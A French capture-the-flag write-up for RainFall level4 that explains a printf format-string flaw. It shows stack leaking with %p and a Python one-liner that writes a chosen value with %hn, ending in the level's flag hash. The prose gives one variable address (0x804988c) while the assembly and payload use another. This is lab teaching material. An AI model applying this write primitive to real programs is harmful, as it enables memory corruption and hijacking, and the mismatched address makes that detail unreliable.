Nous remarquons que le programme utilise un fgets, puis met la sortie de fgets en premier argument du printf, ce qui est une faille de sécurité. Nous pouvons mettre une valeur de notre choix à certaines adresses, grâce à l'utilisation du flag %n.

L'assembleur nous montre une comparaison entre 16930116 et la variable global à l'adresse `0x804988c`, si la comparaison réussi l'on peut acceder au shell.

```asm
 804848d:	a1 10 98 04 08       	mov    0x8049810,%eax
 8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax
```

Nous recherchons l'adresse de début du buffer à l'aide de printf.

```bash
level4@RainFall:~$ ./level4 
aaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
aaaa0xb7ff26b0.0xbffff784.0xb7fd0ff4.(nil).(nil).0xbffff748.0x804848d.0xbffff540.0x200.0xb7fd1ac0.0xb7ff37d0.0x61616161
```

Le nombre 16930116 étant trop grand, on identifie la partie haute/basse du nombre afin de pouvoir le mettre en deux fois.

```python
>>> hex(16930116)
'0x1025544'
>>> 0x1025544 >> 16
258
>>> 0x1025544 & 0xFFFF
21828
```

Ensuite, il nous suffit de stipuler l'adresse de la variable que l'on veut modifier, ainsi que son offset dans la stack et on remplit la partie haute de la variable afin d'y mettre la valeur de 258. Et la partie basse de la variable, à la valeur de 21828.

```bash
level4@RainFall:~$ python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%21570x%13$hn"' | ./level4 
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
